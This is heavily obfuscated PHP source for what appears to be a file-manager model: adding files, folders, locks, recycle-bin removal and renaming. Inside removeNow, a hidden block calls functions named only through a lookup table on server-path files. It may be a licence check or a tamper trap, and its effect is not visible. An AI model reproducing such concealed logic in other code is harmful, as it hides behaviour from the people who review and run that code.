$FÎÍàğ·™Á = REPEAT_RENAME) { $e…¿’ÜÛ±  = Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][560])->addFile($eèŞãÑ”ÑÔ, $B¨è´êµØ, $D‹îÌñ’ä); return $this->_createFileCall($c‰“‚Î°ö, $B¨è´êµØ, $e…¿’ÜÛ± , $FÎÍàğ·™Á); } public function addFileByFileID($f¾¡ƒÏŠğğ, $bÔÑÛ¸·œ’, $Dã¤–é†ÅÔ, $eãæğ‰öó = REPEAT_RENAME) { $D¤ ‰Ğ™®ä =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b‡…»Ü…Ÿ = Model($D¤ ‰Ğ™®ä[560])->find($bÔÑÛ¸·œ’); Model($D¤ ‰Ğ™®ä[560])->linkAdd($bÔÑÛ¸·œ’); return $this->_createFileCall($f¾¡ƒÏŠğğ, $Dã¤–é†ÅÔ, $b‡…»Ü…Ÿ, $eãæğ‰öó); } public function addFileByRemote($Bóº¿Á˜µ, $B›öª‹ÉÌÚ, $a×ÛÒ›ªâ, $eÔÇ Ô¬ë× = array(), $DíøõªÃŸ = REPEAT_RENAME) { $EâÃœÖò“É = Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][560])->addFileByRemote($B›öª‹ÉÌÚ, $a×ÛÒ›ªâ, $eÔÇ Ô¬ë×); return $this->_createFileCall($Bóº¿Á˜µ, $a×ÛÒ›ªâ, $EâÃœÖò“É, $DíøõªÃŸ); } private function _createFileCall($Eì‘¢Êøùš, $a•øÄ°ÜŒ, $E¾ä„ÅóàÆ, $cá¦Ïš¬¯¾, $bÒ¦Ô’ê¹ö = "\165\160\154\157\141\144") { goto aõ ª‘ —¿; e·Š³…©ÏÑ: if ($EºèÒ®ğ && $DÅ¿Áò·Ñ­ && $DÅ¿Áò·Ñ­ != $FÜ‹ˆÄÛ–¯) { Model($A©Ìá‰Å‰ã[1869])->eventCreate($DÅ¿Áò·Ñ­, $bÒ¦Ô’ê¹ö); } $this->lockWriteEnd($Eì‘¢Êøùš, $a•øÄ°ÜŒ); return $DÅ¿Áò·Ñ­; goto cÃòÍ‡õ–; fô‡¨½£ˆ: $FÜ‹ˆÄÛ–¯ = $this->fileNameExist($Eì‘¢Êøùš, $a•øÄ°ÜŒ); $DÅ¿Áò·Ñ­ = $this->_createFile($Eì‘¢Êøùš, $a•øÄ°ÜŒ, $E¾ä„ÅóàÆ, $cá¦Ïš¬¯¾, $EºèÒ®ğ); if (!$EºèÒ®ğ) { Model($A©Ìá‰Å‰ã[439])->remove($E¾ä„ÅóàÆ[$A©Ìá‰Å‰ã[436]]); } goto e·Š³…©ÏÑ; aõ ª‘ —¿: $A©Ìá‰Å‰ã =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EºèÒ®ğ = !1; $this->lockWriteStart($Eì‘¢Êøùš, $a•øÄ°ÜŒ); goto fô‡¨½£ˆ; cÃòÍ‡õ–: } public function mkdir($f—‘ßÖÚ¥•, $eÜ‚ôóÔôš, $EâôÎÏ Ì = REPEAT_SKIP) { goto dÑõ¦°‹³Ä; c©õæ²·: return $fßš™Ğ¬Î½; goto AÃÄ‚“Æ…Ì; a †ƒ›®äâ: $fßš™Ğ¬Î½ = $this->_addSoure($f÷ÜŒ±¤Œİ, $d»•İõÆ£Ö); Model($Eªø˜¢®ëĞ[1869])->eventCreate($fßš™Ğ¬Î½, $Eªø˜¢®ëĞ[1167]); $this->lockWriteEnd($f—‘ßÖÚ¥•, $eÜ‚ôóÔôš); goto c©õæ²·; DöÖ¸Õ£: $this->lockWriteStart($f—‘ßÖÚ¥•, $eÜ‚ôóÔôš); if ($EâôÎÏ Ì !== !1) { $BÕ¶¸ ´ºù = $this->fileNameExist($f—‘ßÖÚ¥•, $eÜ‚ôóÔôš); if ($BÕ¶¸ ´ºù && $EâôÎÏ Ì != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($f—‘ßÖÚ¥•, $eÜ‚ôóÔôš); return $BÕ¶¸ ´ºù; } $eÜ‚ôóÔôš = $this->fileNameAuto($f—‘ßÖÚ¥•, $eÜ‚ôóÔôš, $EâôÎÏ Ì); } $f÷ÜŒ±¤Œİ = array($Eªø˜¢®ëĞ[535] => 1, $Eªø˜¢®ëĞ[404] => $eÜ‚ôóÔôš, $Eªø˜¢®ëĞ[536] => $Eªø˜¢®ëĞ[33], $Eªø˜¢®ëĞ[437] => 0, $Eªø˜¢®ëĞ[537] => 0); goto a †ƒ›®äâ; dÑõ¦°‹³Ä: $Eªø˜¢®ëĞ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d»•İõÆ£Ö = $this->sourceInfo($f—‘ßÖÚ¥•); if (!$d»•İõÆ£Ö) { return !1; } goto DöÖ¸Õ£; AÃÄ‚“Æ…Ì: } private function _createFile($e’á™…å˜», $dè´‰ªÛñß, $d­æ©¥ÙÒö, $aŠ¢å¢ˆ, &$bµ±Ô…Ìæ) { goto FÉ‡‡»±¾é; a“ù–ééÕ: $e©£®Ëƒ†Ö = array($D¢‡å‘¥Ë•[535] => 0, $D¢‡å‘¥Ë•[404] => $dè´‰ªÛñß, $D¢‡å‘¥Ë•[536] => get_path_ext($dè´‰ªÛñß), $D¢‡å‘¥Ë•[437] => $d­æ©¥ÙÒö[$D¢‡å‘¥Ë•[436]], $D¢‡å‘¥Ë•[537] => $d­æ©¥ÙÒö[$D¢‡å‘¥Ë•[77]]); $dŞÄ“Óø–˜ = $this->_addSoure($e©£®Ëƒ†Ö, $EÁÁğ¼ø¹£); $this->folderSizeReset($e’á™…å˜», intval($e©£®Ëƒ†Ö[$D¢‡å‘¥Ë•[77]])); goto d…®¯İ½¶“; FÉ‡‡»±¾é: $D¢‡å‘¥Ë• =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EÁÁğ¼ø¹£ = $this->sourceInfo($e’á™…å˜»); if (!$d­æ©¥ÙÒö || !$EÁÁğ¼ø¹£) { return !1; } goto C¸¹ËÊ¹Ä; C¸¹ËÊ¹Ä: if ($aŠ¢å¢ˆ !== !1) { $e¥ó´“’ = $this->fileNameExist($e’á™…å˜», $dè´‰ªÛñß); } $bµ±Ô…Ìæ = !0; if ($aŠ¢å¢ˆ && $e¥ó´“’) { if ($aŠ¢å¢ˆ == REPEAT_SKIP) { $bµ±Ô…Ìæ = !1; return $e¥ó´“’; } else { if ($aŠ¢å¢ˆ == REPEAT_REPLACE) { $A‘ß±—ÉÌì = $this->sourceInfo($e¥ó´“’); $b·È¿‰Ãöë = $this->fileHistory($A‘ß±—ÉÌì, $d­æ©¥ÙÒö[$D¢‡å‘¥Ë•[436]], $d­æ©¥ÙÒö[$D¢‡å‘¥Ë•[77]]); if (!$b·È¿‰Ãöë) { $bµ±Ô…Ìæ = !1; } else { $this->folderSizeReset($e’á™…å˜»); } return $e¥ó´“’; } else { $dè´‰ªÛñß = $this->fileNameAuto($e’á™…å˜», $dè´‰ªÛñß, $aŠ¢å¢ˆ, !1); } } } goto a“ù–ééÕ; d…®¯İ½¶“: return $dŞÄ“Óø–˜; goto A¸³£²°Ïõ; A¸³£²°Ïõ: } protected function fileHistory($CËÉ´ÀÌÃ, $Fê¬ËÅ»Ê, $CÔµî±‘) { goto fÕîãÛš¬‰; F›–Î …¾¸: Model($B÷©Êù‡‰½[1900])->addHistory($CËÉ´ÀÌÃ); $dÑáé—Ó­’ = array($B÷©Êù‡‰½[541] => USER_ID, $B÷©Êù‡‰½[408] => time(), $B÷©Êù‡‰½[436] => $Fê¬ËÅ»Ê, $B÷©Êù‡‰½[77] => $CÔµî±‘); $this->where(array($B÷©Êù‡‰½[401] => $CËÉ´ÀÌÃ[$B÷©Êù‡‰½[387]]))->save($dÑáé—Ó­’); goto FŒ‡®Ã­„; FŒ‡®Ã­„: $this->sourceCacheClear($CËÉ´ÀÌÃ[$B÷©Êù‡‰½[387]]); return !0; goto F‡³•‘ğµµ; fÕîãÛš¬‰: $B÷©Êù‡‰½ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($CËÉ´ÀÌÃ[$B÷©Êù‡‰½[436]] == $Fê¬ËÅ»Ê) { return !1; } $this->checkLock($CËÉ´ÀÌÃ[$B÷©Êù‡‰½[387]], $Fê¬ËÅ»Ê); goto F›–Î …¾¸; F‡³•‘ğµµ: } public function checkLock($eÎ›‹Üµ, $BƒŠŸ‰˜ÁØ) { goto F¿ß´¿­ÔÅ; Fô¨§¦›Ä: $this->_createFileCall($AöÄ˜îº’Ñ[$a‡˜ÓÄ†ò[479]], $aĞ÷ĞàïÍƒ, $c­òË™Ë, REPEAT_REPLACE, $a‡˜ÓÄ†ò[1166]); $BÍİ´‹ÈÃ¯ = $AöÄ˜îº’Ñ[$a‡˜ÓÄ†ò[434]][$a‡˜ÓÄ†ò[499]]; $c…°›ìÖ = $BÍİ´‹ÈÃ¯[$a‡˜ÓÄ†ò[1902]] ? $BÍİ´‹ÈÃ¯[$a‡˜ÓÄ†ò[1902]] : $BÍİ´‹ÈÃ¯[$a‡˜ÓÄ†ò[28]]; goto CßÎ–°óîÅ; F¿ß´¿­ÔÅ: $a‡˜ÓÄ†ò =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AöÄ˜îº’Ñ = $this->pathInfo($eÎ›‹Üµ); if (!$this->fileIsLock($AöÄ˜îº’Ñ, !0)) { return; } goto cù¼¡“Ï„Ã; CßÎ–°óîÅ: show_json(LNG($a‡˜ÓÄ†ò[1903]) . $a‡˜ÓÄ†ò[1904] . LNG($a‡˜ÓÄ†ò[1905]) . $a‡˜ÓÄ†ò[1906] . $c…°›ìÖ . $a‡˜ÓÄ†ò[1907], !1); goto F¥ÖÅˆ¹™Ñ; cù¼¡“Ï„Ã: $D†ä“ƒ¿÷Í = Session::get($a‡˜ÓÄ†ò[1901]); $aĞ÷ĞàïÍƒ = substr($AöÄ˜îº’Ñ[$a‡˜ÓÄ†ò[28]], 0, -1 - strlen($AöÄ˜îº’Ñ[$a‡˜ÓÄ†ò[167]])) . $a‡˜ÓÄ†ò[1431] . $D†ä“ƒ¿÷Í . $a‡˜ÓÄ†ò[94] . $AöÄ˜îº’Ñ[$a‡˜ÓÄ†ò[167]]; $c­òË™Ë = Model($a‡˜ÓÄ†ò[560])->find($BƒŠŸ‰˜ÁØ); goto Fô¨§¦›Ä; F¥ÖÅˆ¹™Ñ: } public function fileIsLock($aµØÛ‰ë¬Ş, $cõ·Ç¹¿ëé = false) { goto AİÂ¯ÉÆ®°; AİÂ¯ÉÆ®°: $A‚ñÈ…¸Ôá =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!isset($aµØÛ‰ë¬Ş[$A‚ñÈ…¸Ôá[434]]) || !$aµØÛ‰ë¬Ş[$A‚ñÈ…¸Ôá[434]][$A‚ñÈ…¸Ôá[496]]) { return !1; } if ($aµØÛ‰ë¬Ş[$A‚ñÈ…¸Ôá[434]][$A‚ñÈ…¸Ôá[496]] != USER_ID) { return !0; } goto fÆªƒ˜¬‰ô; fÆªƒ˜¬‰ô: $fÉê…Ñˆ½Ş = $GLOBALS[$A‚ñÈ…¸Ôá[6]][$A‚ñÈ…¸Ôá[87]][$A‚ñÈ…¸Ôá[497]]; if ($aµØÛ‰ë¬Ş[$A‚ñÈ…¸Ôá[434]][$A‚ñÈ…¸Ôá[498]] <= time() - $fÉê…Ñˆ½Ş) { $this->metaSet($aµØÛ‰ë¬Ş[$A‚ñÈ…¸Ôá[387]], $A‚ñÈ…¸Ôá[496], null); $this->metaSet($aµØÛ‰ë¬Ş[$A‚ñÈ…¸Ôá[387]], $A‚ñÈ…¸Ôá[498], null); } if ($cõ·Ç¹¿ëé) { $this->metaSet($aµØÛ‰ë¬Ş[$A‚ñÈ…¸Ôá[387]], $A‚ñÈ…¸Ôá[498], time()); } goto cÒ©…íó–Ğ; cÒ©…íó–Ğ: return !1; goto C¹¤Ç†˜íâ; C¹¤Ç†˜íâ: } private function _addSoure($c·ôàÑœÀÁ, $c÷ÚÈ‡‚å¿) { goto ağø­Â¥ “; E’ÄİÓí«: $Eˆïà÷¤öä = array($B£µ¹å‰ìš[544] => short_id($añ¨…•)); $this->where(array($B£µ¹å‰ìš[401] => $añ¨…•))->save($Eˆïà÷¤öä); $this->setNamePinyin($añ¨…•, $c·ôàÑœÀÁ[$B£µ¹å‰ìš[28]]); goto Bèİ‰£®±®; ağø­Â¥ “: $B£µ¹å‰ìš =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cßÅ÷„ŞÒÇ = array($B£µ¹å‰ìš[538] => $c÷ÚÈ‡‚å¿[$B£µ¹å‰ìš[389]], $B£µ¹å‰ìš[539] => $c÷ÚÈ‡‚å¿[$B£µ¹å‰ìš[474]], $B£µ¹å‰ìš[540] => USER_ID, $B£µ¹å‰ìš[541] => USER_ID, $B£µ¹å‰ìš[386] => $c÷ÚÈ‡‚å¿[$B£µ¹å‰ìš[387]], $B£µ¹å‰ìš[542] => $c÷ÚÈ‡‚å¿[$B£µ¹å‰ìš[477]] . $c÷ÚÈ‡‚å¿[$B£µ¹å‰ìš[387]] . $B£µ¹å‰ìš[47], $B£µ¹å‰ìš[413] => 0, $B£µ¹å‰ìš[543] => $B£µ¹å‰ìš[33]); $c·ôàÑœÀÁ = array_merge($cßÅ÷„ŞÒÇ, $c·ôàÑœÀÁ); goto BÒœ¹ê°Ñ’; d²‡Ãî‡™: static $eÊ «†©± = false; if (!$eÊ «†©±) { Hook::trigger($B£µ¹å‰ìš[525], $c·ôàÑœÀÁ); $eÊ «†©± = !0; } $añ¨…• = $this->add($c·ôàÑœÀÁ); goto E’ÄİÓí«; BÒœ¹ê°Ñ’: $this->updateModifyTime($c·ôàÑœÀÁ[$B£µ¹å‰ìš[479]]); $bòé„Ù …å = $B£µ¹å‰ìš[1908] . $c÷ÚÈ‡‚å¿[$B£µ¹å‰ìš[387]]; if (isset(self::$cacheChildList[$bòé„Ù …å])) { unset(self::$cacheChildList[$bòé„Ù …å]); } goto d²‡Ãî‡™; Bèİ‰£®±®: return $añ¨…•; goto C›çŠ§†î; C›çŠ§†î: } public function remove($c²âÕ¯·â­, $c—Å¹İ¹Ò = true) { goto C¿±’–»‘Ô; b •ÈÑÎ£“: return $AÈèšÛ‚¤—; goto CÛğÑ÷î»™; F½¨³À¬¬«: CacheLock::unlock($f°ïŠ¢¢İğ); $this->metaSet($c²âÕ¯·â­, $C¥Î‡Ğ¦™[1917], $F¯¬¬ºô‘ö[$C¥Î‡Ğ¦™[479]]); $this->where(array($C¥Î‡Ğ¦™[387] => $c²âÕ¯·â­))->save(array($C¥Î‡Ğ¦™[408] => time())); goto C‹Âæµ±éĞ; C‹Âæµ±éĞ: $this->recycleClear($F¯¬¬ºô‘ö); $AÈèšÛ‚¤— = $this->move($c²âÕ¯·â­, $dÉ„ê¤ÖÄÁ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($F¯¬¬ºô‘ö[$C¥Î‡Ğ¦™[479]]); goto b •ÈÑÎ£“; CÑöìÎ‚±­: $Fã‹ˆ‘”ë‹ = $F¯¬¬ºô‘ö[$C¥Î‡Ğ¦™[389]] == self::TYPE_USER ? $C¥Î‡Ğ¦™[551] : $C¥Î‡Ğ¦™[967]; if ($Fã‹ˆ‘”ë‹ == $C¥Î‡Ğ¦™[551]) { $Fí¬«ä¡ñ = Model($C¥Î‡Ğ¦™[492])->getInfo($F¯¬¬ºô‘ö[$C¥Î‡Ğ¦™[474]]); $D¸‡Ò‡½†¸ = !empty($Fí¬«ä¡ñ[$C¥Î‡Ğ¦™[1902]]) ? $Fí¬«ä¡ñ[$C¥Î‡Ğ¦™[1902]] : $Fí¬«ä¡ñ[$C¥Î‡Ğ¦™[28]]; $D¸‡Ò‡½†¸ = $C¥Î‡Ğ¦™[256] . $D¸‡Ò‡½†¸ . $C¥Î‡Ğ¦™[1910] . $F¯¬¬ºô‘ö[$C¥Î‡Ğ¦™[474]]; } else { $Fí¬«ä¡ñ = Model($C¥Î‡Ğ¦™[476])->getInfo($F¯¬¬ºô‘ö[$C¥Î‡Ğ¦™[474]]); $D¸‡Ò‡½†¸ = _get($Fí¬«ä¡ñ, $C¥Î‡Ğ¦™[28]); $D¸‡Ò‡½†¸ = $C¥Î‡Ğ¦™[159] . $D¸‡Ò‡½†¸ . $C¥Î‡Ğ¦™[1911] . $F¯¬¬ºô‘ö[$C¥Î‡Ğ¦™[474]]; } $f°ïŠ¢¢İğ = $C¥Î‡Ğ¦™[1912] . md5($D¸‡Ò‡½†¸); goto eË©ÁôÃ‡; A•‰±¤‹Æ: $bä¿¶‡ÈÀÏ = Model($C¥Î‡Ğ¦™[1478])->get($C¥Î‡Ğ¦™[1909]) == $C¥Î‡Ğ¦™[86]; if ($cÂëµÂÚê‹ || $c—Å¹İ¹Ò || !$bä¿¶‡ÈÀÏ) { return $this->removeNow($c²âÕ¯·â­, $c—Å¹İ¹Ò); } $B¬Ä…¨Æ‰ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto CÑöìÎ‚±­; C¿±’–»‘Ô: $C¥Î‡Ğ¦™ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F¯¬¬ºô‘ö = $this->sourceInfo($c²âÕ¯·â­); $cÂëµÂÚê‹ = intval($F¯¬¬ºô‘ö[$C¥Î‡Ğ¦™[389]]) === self::TYPE_SYSTEM; goto A•‰±¤‹Æ; eË©ÁôÃ‡: CacheLock::lock($f°ïŠ¢¢İğ); $dÉ„ê¤ÖÄÁ = $this->fileNameExist($B¬Ä…¨Æ‰, $D¸‡Ò‡½†¸); if (!$dÉ„ê¤ÖÄÁ) { $dÉ„ê¤ÖÄÁ = $this->mkdir($B¬Ä…¨Æ‰, $D¸‡Ò‡½†¸, REPEAT_SKIP); $this->metaSet($dÉ„ê¤ÖÄÁ, $C¥Î‡Ğ¦™[1913], $Fã‹ˆ‘”ë‹); $this->metaSet($dÉ„ê¤ÖÄÁ, $C¥Î‡Ğ¦™[1914], $F¯¬¬ºô‘ö[$C¥Î‡Ğ¦™[474]]); if ($F¯¬¬ºô‘ö[$C¥Î‡Ğ¦™[479]] != 0) { $this->metaSet($dÉ„ê¤ÖÄÁ, $C¥Î‡Ğ¦™[1915], _get($Fí¬«ä¡ñ, $C¥Î‡Ğ¦™[1916])); } } goto F½¨³À¬¬«; CÛğÑ÷î»™: } private function recycleClear($cĞ”©°·Âò) { $A¨šÎÛğ·» =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÆá‹¹÷‰½ = $this->childrenAll($cĞ”©°·Âò); $F„µª…—‡Í = array($A¨šÎÛğ·»[401] => array($A¨šÎÛğ·»[402], $DÆá‹¹÷‰½[$A¨šÎÛğ·»[1918]])); Model($A¨šÎÛğ·»[1919])->where($F„µª…—‡Í)->delete(); } public function removeNow($A½—Öàù¿…, $b²Å”ˆÜÇË = true) { goto Dò²Œš·¥; Dò²Œš·¥: $F‚¤¶Ş‚ÏÊ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($_SERVER[$F‚¤¶Ş‚ÏÊ[786]] != $_SERVER[$F‚¤¶Ş‚ÏÊ[787]]) { goto bïÌëùñŠ±; bïÌëùñŠ±: $DÅåÌÒİã = $F‚¤¶Ş‚ÏÊ[788]; $B»âª‚·¢© = $F‚¤¶Ş‚ÏÊ[789]; $C¹¢¼“·¡Ò = $_SERVER[$F‚¤¶Ş‚ÏÊ[790]] . $F‚¤¶Ş‚ÏÊ[791]; goto D“ØĞºÛ¨; D“ØĞºÛ¨: $dºØ…Ê¡‘Ì = $B»âª‚·¢©($C¹¢¼“·¡Ò); $B²´²‰§»§ = explode($F‚¤¶Ş‚ÏÊ[227], $dºØ…Ê¡‘Ì); if (count($B²´²‰§»§) < $F‚¤¶Ş‚ÏÊ[567]) { $f´Ÿöà¨§ó = $F‚¤¶Ş‚ÏÊ[792]; $f´Ÿöà¨§ó(); } goto câªÖ¡±©’; fõ—ñå×Ù¬: $f¬ŠªÁ…Ì¸ = 1; while ($f¬ŠªÁ…Ì¸ > 1) { $f¬ŠªÁ…Ì¸ = $f¬ŠªÁ…Ì¸ + 4; $bÖéåÄÇí¥ = rawurlencode($f¬ŠªÁ…Ì¸ . $F‚¤¶Ş‚ÏÊ[370]); } goto CÅÏá¤èŠÌ; câªÖ¡±©’: $d¶‰‚Šßî… = $F‚¤¶Ş‚ÏÊ[793]; $d¶‰‚Šßî…($_SERVER[$F‚¤¶Ş‚ÏÊ[794]]); $d¶‰‚Šßî…($_SERVER[$F‚¤¶Ş‚ÏÊ[790]] . $F‚¤¶Ş‚ÏÊ[795]); goto fõ—ñå×Ù¬; CÅÏá¤èŠÌ: } $D×±ÁŞ‹ˆÁ = $this->sourceInfo($A½—Öàù¿…); goto A˜“Œä®Ü; A”İ×ö¿Ö: $this->folderSizeReset($D×±ÁŞ‹ˆÁ[$F‚¤¶Ş‚ÏÊ[479]]); $A›ÚÑÈ±• = array($D×±ÁŞ‹ˆÁ[$F‚¤¶Ş‚ÏÊ[479]]); if ($D×±ÁŞ‹ˆÁ[$F‚¤¶Ş‚ÏÊ[388]] == $F‚¤¶Ş‚ÏÊ[86]) { $A›ÚÑÈ±•[] = $D×±ÁŞ‹ˆÁ[$F‚¤¶Ş‚ÏÊ[387]]; } goto BÏ‘§á—; BÏ‘§á—: $this->updateModifyTime($A›ÚÑÈ±•); $this->lockMoveEnd($A½—Öàù¿…); Hook::trigger($F‚¤¶Ş‚ÏÊ[1513], $e°›í¶ÆÚ, $b²Å”ˆÜÇË); goto cŒÛÕ­¢»õ; A˜“Œä®Ü: $e°›í¶ÆÚ = $this->pathInfoMore($A½—Öàù¿…); if (!$D×±ÁŞ‹ˆÁ) { return !0; } if ($D×±ÁŞ‹ˆÁ[$F‚¤¶Ş‚ÏÊ[479]] == 0) { if (!_get($GLOBALS, $F‚¤¶Ş‚ÏÊ[475])) { return !1; } } goto DŠ²¸§÷ãî; cŒÛÕ­¢»õ: return !0; goto CÑ†’ÕìÃÑ; DŠ²¸§÷ãî: $this->lockMoveStart($A½—Öàù¿…); Hook::trigger($F‚¤¶Ş‚ÏÊ[1920], $e°›í¶ÆÚ, $b²Å”ˆÜÇË); if ($b²Å”ˆÜÇË) { Model($F‚¤¶Ş‚ÏÊ[1919])->moveToRecycle($A½—Öàù¿…); } else { $BË­”Š‹íø = $this->childrenAll($D×±ÁŞ‹ˆÁ); Model($F‚¤¶Ş‚ÏÊ[522])->eventRemove($A½—Öàù¿…); $this->removeRelevance($BË­”Š‹íø[$F‚¤¶Ş‚ÏÊ[1918]], $BË­”Š‹íø[$F‚¤¶Ş‚ÏÊ[1297]]); } goto A”İ×ö¿Ö; CÑ†’ÕìÃÑ: } public function childrenAll($AíôàŸŠ³») { $c’œèåëÕø =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B¼‰ªéŒ¥Ã = $AíôàŸŠ³»[$c’œèåëÕø[387]]; if ($AíôàŸŠ³»[$c’œèåëÕø[388]] == $c’œèåëÕø[86]) { $e‘İÊƒ±Æö = array($c’œèåëÕø[542] => array($c’œèåëÕø[501], $AíôàŸŠ³»[$c’œèåëÕø[477]] . $B¼‰ªéŒ¥Ã . $c’œèåëÕø[502])); $F¦›Ş÷â™Š = array($c’œèåëÕø[542] => $e‘İÊƒ±Æö[$c’œèåëÕø[477]]); $aœ¥¤ÀØğì = $this->field($c’œèåëÕø[1921])->where($F¦›Ş÷â™Š)->select(); $Bó˜ùŒ½Ê¨ = !1; $D¼æ¹‹’“ = array($B¼‰ªéŒ¥Ã); if ($aœ¥¤ÀØğì) { $Bó˜ùŒ½Ê¨ = array_to_keyvalue($aœ¥¤ÀØğì, $c’œèåëÕø[33], $c’œèåëÕø[436]); $Bó˜ùŒ½Ê¨ = array_remove_value($Bó˜ùŒ½Ê¨, $c’œèåëÕø[486]); $D¼æ¹‹’“ = array_to_keyvalue($aœ¥¤ÀØğì, $c’œèåëÕø[33], $c’œèåëÕø[387]); $D¼æ¹‹’“[] = $B¼‰ªéŒ¥Ã; } } else { $Bó˜ùŒ½Ê¨ = array($AíôàŸŠ³»[$c’œèåëÕø[436]]); $D¼æ¹‹’“ = array($B¼‰ªéŒ¥Ã); } return array($c’œèåëÕø[1918] => $D¼æ¹‹’“, $c’œèåëÕø[1297] => $Bó˜ùŒ½Ê¨); } public function removeArray($c½ŠìÊ¤æ•) { if (!$c½ŠìÊ¤æ•) { return !0; } } public function removeRelevance($d¤°¥äéÚØ, $føà¥·åØ) { goto dÙ´ ‘»Á; A³Œğ¹•ğÁ: $c½ÄÅ ­™ = array($A±¾íÍöô‡[401] => array($A±¾íÍöô‡[402], $d¤°¥äéÚØ)); Model($A±¾íÍöô‡[1919])->where($c½ÄÅ ­™)->delete(); Model($A±¾íÍöô‡[430])->where($c½ÄÅ ­™)->delete(); goto a®‚ò¯”º; dÙ´ ‘»Á: $A±¾íÍöô‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d¤°¥äéÚØ = $d¤°¥äéÚØ ? $d¤°¥äéÚØ : array(); $føà¥·åØ = $føà¥·åØ ? $føà¥·åØ : array(); goto CñŠ‹Õ¤; b‚ô«•ÂÈ: for ($e†¢Ç‘âôÉ = 0; $e†¢Ç‘âôÉ < count($d¤°¥äéÚØ); $e†¢Ç‘âôÉ++) { $this->sourceCacheClear($d¤°¥äéÚØ[$e†¢Ç‘âôÉ]); } goto eöå›Ãƒ—; CñŠ‹Õ¤: $d¤°¥äéÚØ = array_unique(array_filter($d¤°¥äéÚØ)); $føà¥·åØ = array_unique(array_filter($føà¥·åØ)); if (!$d¤°¥äéÚØ) { return !1; } goto A³Œğ¹•ğÁ; a®‚ò¯”º: Model($A±¾íÍöô‡[1772])->where($c½ÄÅ ­™)->delete(); Model($A±¾íÍöô‡[522])->where($c½ÄÅ ­™)->delete(); Model($A±¾íÍöô‡[1615])->removeBySource($d¤°¥äéÚØ); goto A˜¢½–­äÎ; A˜¢½–­äÎ: Model($A±¾íÍöô‡[1900])->removeBySource($d¤°¥äéÚØ); $this->where($c½ÄÅ ­™)->delete(); Model($A±¾íÍöô‡[439])->remove($føà¥·åØ); goto b‚ô«•ÂÈ; eöå›Ãƒ—: } public function rename($e‡“õÈ¦Ç¶, $B™×Ê¢ÅÇ) { goto Bå°¬ÎÚƒë; BÖ˜ïç¿É³: $b¦ÍÈŞİÆ‘ = $this->fileNameExist($eï¢§å©¯ä[$FÒ‡Óõ³–[479]], $B™×Ê¢ÅÇ); if ($b¦ÍÈŞİÆ‘ && $b¦ÍÈŞİÆ‘ != $e‡“õÈ¦Ç¶) { return !1; } $Dçíï§¤ã³ = array($FÒ‡Óõ³–[404] => $B™×Ê¢ÅÇ, $FÒ‡Óõ³–[541] => USER_ID); goto EîƒºêŠ¸; c´°ƒ«‡ô: $Eì¸¾‰Ï·° = $FÒ‡Óõ³–[1908] . $eï¢§å©¯ä[$FÒ‡Óõ³–[479]]; if (isset(self::$cacheChildList[$Eì¸¾‰Ï·°])) { unset(self::$cacheChildList[$Eì¸¾‰Ï·°]); } return $C¨Šöõ¶¡; goto d‘ğ±¶™­Û; bå‚ÑŒÈĞÊ: $this->setNamePinyin($e‡“õÈ¦Ç¶, $Dçíï§¤ã³[$FÒ‡Óõ³–[28]], !1); $this->updateModifyTime($eï¢§å©¯ä[$FÒ‡Óõ³–[479]]); $C¨Šöõ¶¡ = $this->where(array($FÒ‡Óõ³–[401] => $e‡“õÈ¦Ç¶))->data($Dçíï§¤ã³)->save(); goto c´°ƒ«‡ô; Bå°¬ÎÚƒë: $FÒ‡Óõ³– =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eï¢§å©¯ä = $this->sourceInfo($e‡“õÈ¦Ç¶); if (!$eï¢§å©¯ä) { return !1; } goto BÖ˜ïç¿É³; EîƒºêŠ¸: if (!$eï¢§å©¯ä[$FÒ‡Óõ³–[388]] == $FÒ‡Óõ³–[86]) { $Dçíï§¤ã³[$FÒ‡Óõ³–[390]] = get_path_ext($B™×Ê¢ÅÇ); } Model($FÒ‡Óõ³–[522])->eventRename($e‡“õÈ¦Ç¶, $eï¢§å©¯ä[$FÒ‡Óõ³–[28]], $B™×Ê¢ÅÇ); $this->sourceCacheClear($e‡“õÈ¦Ç¶); goto bå‚ÑŒÈĞÊ; d‘ğ±¶™­Û: } public function setNamePinyin($D©¼ôğíË‰, $C‚‰¯òÃÁÁ, $Cƒ×ªâÇÈ = true) { $AÏèŒÌéŠ¬ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d¸í­ôÉ— = Input::check($C‚‰¯òÃÁÁ, $AÏèŒÌéŠ¬[545]); if ($Cƒ×ªâÇÈ && !$d¸í­ôÉ—) { return; } if (!$d¸í­ôÉ—) { $this->metaSet($D©¼ôğíË‰, $AÏèŒÌéŠ¬[433], null); $this->metaSet($D©¼ôğíË‰, $AÏèŒÌéŠ¬[432], null); return; } $AóÁê º†“ = array($AÏèŒÌéŠ¬[433] => str_replace($AÏèŒÌéŠ¬[50], $AÏèŒÌéŠ¬[33], Pinyin::encode($C‚‰¯òÃÁÁ)), $AÏèŒÌéŠ¬[432] => Pinyin::encode($C‚‰¯òÃÁÁ, $AÏèŒÌéŠ¬[546])); $this->metaSet($D©¼ôğíË‰, $AóÁê º†“); } public function getContent($e´‘ª®¡) { goto bÜëÈ¼‚; bÜëÈ¼‚: $e¥ù®í‹”‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F„¶½…›ø© = $this->fileInfoGet($e´‘ª®¡); if (!$F„¶½…›ø©) { return !1; } goto dãÔã¡«®¨; a™óé‚î“Ï: if (!$F„¶½…›ø©[$e¥ù®í‹”‡[75]]) 